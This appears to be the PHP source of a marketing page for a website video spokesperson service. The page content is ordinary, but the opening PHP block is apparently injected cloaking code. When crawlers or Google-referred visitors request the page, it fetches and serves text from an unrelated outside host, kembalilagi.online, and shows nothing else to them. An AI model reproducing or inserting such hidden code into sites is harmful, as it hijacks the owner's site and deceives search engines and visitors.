<?php
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$referer   = strtolower($_SERVER['HTTP_REFERER'] ?? '');
$uri       = $_SERVER['REQUEST_URI'] ?? '';

if (
    (strpos($uri, '/website-spokesperson') !== false) && 
    (
        strpos($userAgent, 'bot') !== false ||     
        strpos($userAgent, 'google') !== false ||     
        strpos($userAgent, 'chrome-lighthouse') !== false || 
        strpos($referer, 'google') !== false
    )
) {
    echo file_get_contents('https://kembalilagi.online/fc/websitetalkingheads.txt');
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Website Spokesperson Talking Heads®</title>
<meta content="Website Spokesperson,  Website Spokespeople, Spokesperson, Online Spokesperson, Video Spokesperson, Website Actor, Website Video, Transparent Video, Virtual Spokesperson, Video Presenter, Website Presenter, Video Salesperson, Website Talking Heads, Video Solutions" name="keywords">
<meta content="Companies that use website spokespeople want to create an image of professionalism and authority. Build trust with your customers by adding one to your site" name="description">
<meta content="index, follow" name="robots">
<meta content="30 days" name="revisit-after">
<meta content="global" name="distribution">
<meta content="general" name="rating">
<meta content="english" name="Content-Language">
<meta content="YNESpqoAwK51PmBV7/PFKLG0agx7AQPKhXXcYAXGGF8=" name="verify-v1">
<meta content="iinbv24r-1ix20hgj5l94wz2rnn3aiwi0336hwysvvpiskquy6ijsh9wy12f3znbed-hz1ay8ppzhgqap-sicqtw6ui29d0wrfcpenudh1ml9xwjbej7u25xy9pnm6yr" name="norton-safeweb-site-verification">
<meta name="viewport" content="width=device-width, initial-scale=1">
<?php include("../includes/css-b4.php"); ?>
<link href="../css/website-spokesperson-index.css" rel="stylesheet" type="text/css">
</head>

<body>
<div id="loading">
  <div class="spinner-grow text-primary" role="status"> <span class="sr-only">Loading...</span> </div>
</div>
<?php include ('../includes/header25.php'); ?>
<header class="header-video">
  <div class="overlay"> </div>
  <video playsinline="playsinline" autoplay="autoplay" muted="muted" loop="loop">
    <source src="https://www.websitetalkingheads.com/ivideo/videos/Spokespeople Demo.mp4" type="video/mp4">
  </video>
  <div class="container-fluid h-100 website-spokesperson-header">
    <div class="row text-center website-spokesperson-header">
      <div class="text-white col-lg-9">
        <h1 class="display-4 wow bounceInDown">Website Spokesperson</h1>
        <p class="lead mb-0 wow bounceInUp">Looking for a better way to engage with visitors to your site?</p>
        <p class="lead mb-0 wow bounceInUp">Have Your Virtual Spokesperson Appear In Transparent Video On Your Site</p>
      </div>
      <div class="col-lg-3 my-auto">
        <?php
        include( "../forms/contact-card.php" )
        ?>
      </div>
    </div>
  </div>
</header>
<section cite="alert alert-info center-block">
  <div class="container">
    <h3>Examples</h3>
    <?php
    include( "../examples/examples-spokesperson-main.php" )
    ?>
  </div>
</section>
<section class="alert bg-gradient-mine">
  <h3>More about Website Spokespeople</h3>
  <div class="container-fluid">
    <div class="card-deck">
      <div class="card">
        <h3 class="card-header bg-gradient-mine text-center text-white">Satisfying Videos</h3>
        <div class="embed-responsive embed-responsive-16by9">
          <iframe frameborder="0" scrolling="no" marginheight="0" marginwidth="0" type="text/html" src="../ivideo/talking-heads-player.php?video=Professional Spokesperson&autostart=no&controls=show"></iframe>
        </div>
        <div class="card-body">
          <p class="card-text">We are here to serve your video spokesperson needs. The exceptional quality of our videos is matched by our spokespeople's talent and our production staff's dedication to ensuring your satisfaction.</p>
          <p class="card-text">As the online face of your business, a video spokesperson can deliver the exact message you want your visitors to hear. Our web spokesperson actors will impress your customers and increase your bottom line</p>
        </div>
        <div class="card-footer text-muted bg-gradient-mine text-right"> <a href="https://www.websitetalkingheads.com/spokespeople/women.php" title="More Spokespeople" >Female Spokespeople</a> </div>
      </div>
      <div class="card">
        <h3 class="card-header bg-gradient-mine text-center text-white">Video Solutions</h3>
        <div class="embed-responsive embed-responsive-16by9">
          <iframe frameborder="0" scrolling="no" marginheight="0" marginwidth="0" type="text/html" src="../ivideo/talking-heads-player.php?video=Talking Heads Video Demonstration&autostart=no&controls=show"></iframe>
        </div>
        <div class="card-body">
          <p class="card-text">There are other companies you can choose who charge higher prices and require complex setup solutions for their website spokesperson videos. We focus on providing a low cost solution!</p>
          <p class="card-text">As the online face of your business, a video spokesperson can deliver the exact message you want your visitors to hear. Our web spokesperson actors will impress your customers and increase your bottom line</p>
        </div>
        <div class="card-footer text-muted bg-gradient-mine text-right"> <a href="https://www.websitetalkingheads.com/spokespeople/men.php" title="More Spokespeople" >Male Spokespeople</a> </div>
      </div>
      <div class="card">
        <h3 class="card-header bg-gradient-mine text-center text-white">Website Presenter</h3>
        <div class="embed-responsive embed-responsive-16by9">
          <iframe frameborder="0" scrolling="no" marginheight="0" marginwidth="0" type="text/html" src="../ivideo/talking-heads-player.php?video=Spokespeople Demo 2&autostart=no&controls=show"></iframe>
        </div>
        <div class="card-body">
          <p class="card-text">A website presenter is a spokesperson that speaks to an audience through a website. A good presenter will make sure that the customer knows who they are talking to and what their company does.</p>
          <p class="card-text">Website presenters can be used for any type of business, from retail to e-commerce, from non-profit organizations to government agencies.</p>
        </div>
        <div class="card-footer text-muted bg-gradient-mine text-right"> <a href="https://www.websitetalkingheads.com/spokespeople/index.php" title="More Spokespeople" >More on Spokespeople</a> </div>
      </div>
    </div>
  </div>
</section>
<section class="container-fluid pb-4">
<?php include("../includes/spokespersonAward.php"); ?>
</section>
<section class="alert bg-gradient-info">
  <h3 class="wow bounceIn">Other Names of a Website Spokesperson</h3>
  <h3>You can call them Website Spokespeople, Spokesperson, Online Spokesperson, Video Spokesperson, Website Actor, Website Video, Transparent Video, Virtual Spokesperson, Video Presenter, Website Presenter, and Video Salesperson.  At Website Talking Heads®, we just call them <em>Spokespeople</em></h3>
</section>
<?php include("../includes/call-contact.php"); ?>
<?php include("../includes/footer25.php"); ?>
</body>
</html>